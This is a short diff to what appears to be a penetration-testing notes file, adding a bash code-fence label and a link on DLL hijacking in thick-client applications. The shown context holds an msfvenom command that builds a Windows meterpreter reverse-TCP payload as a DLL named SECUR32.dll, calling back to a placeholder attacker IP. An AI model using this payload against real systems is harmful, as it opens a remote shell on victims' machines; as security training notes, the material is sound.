@@ -46,11 +46,12 @@ A stage less payload is a standalone program that does not need anything adition
 
 ## crafting a DLL file with a webshell
 
-```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
 # -p: for the chosen payload
 # -a: architecture in the victim machine/application
 # -f: format for the output file
 ```
+[More about DLL highjacking in thick client applications](thick-applications/tca-attacking-thick-clients-applications.md#how-is-dll-hijacking-perform).
 
 
